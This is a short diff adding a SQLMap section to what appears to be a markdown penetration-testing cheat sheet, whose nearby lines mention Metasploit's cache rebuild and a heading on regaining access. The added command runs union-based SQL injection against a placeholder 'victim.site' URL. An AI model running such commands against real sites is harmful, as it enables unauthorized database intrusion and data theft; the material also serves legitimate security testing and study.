@@ -795,4 +795,8 @@ echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
 ```
 db_rebuild_cache
 ```
+## SQLMap
+```
+sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
+```
 ## How to replicate to otbain access again:
